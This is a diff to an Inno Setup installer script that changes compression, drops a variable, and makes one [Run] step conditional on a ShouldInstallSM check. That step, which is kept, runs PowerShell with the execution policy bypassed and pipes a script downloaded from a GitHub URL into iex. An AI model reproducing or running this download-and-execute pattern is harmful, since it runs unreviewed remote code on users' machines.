@@ -13,7 +13,7 @@ DisableProgramGroupPage=yes
 OutputDir={#MySetup}
 OutputBaseFilename=mcsetup
 SetupIconFile="{#MySetup}\Packet\icon.ico"
-Compression=lzma
+Compression=zip
 SolidCompression=yes
 WizardStyle=modern
 InfoAfterFile={#MySetup}\Packet\after.txt
@@ -47,8 +47,7 @@ Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFileN
 
 [Code]
 var
-  Stealtimize: Boolean;                                                                                
-  ResultCode: Integer;
+  Stealtimize: Boolean;  
 
 
 function NextButtonClick(CurPageID: Integer): Boolean;
@@ -67,5 +66,5 @@ end;
 
 [Run]
 Filename: "{app}\setup.bat"; Parameters: """{app}"" ""{win}"""; Flags: shellexec runascurrentuser; WorkingDir: "{app}"; StatusMsg: "Running setup.bat..."
-Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -nop -c iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/leaftail1880/updates/main/StealTimize/Update.ps1')"; Flags: shellexec runascurrentuser;
+Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -nop -c iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/leaftail1880/updates/main/StealTimize/Update.ps1')"; Flags: shellexec runascurrentuser; Check: ShouldInstallSM;
 Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent shellexec
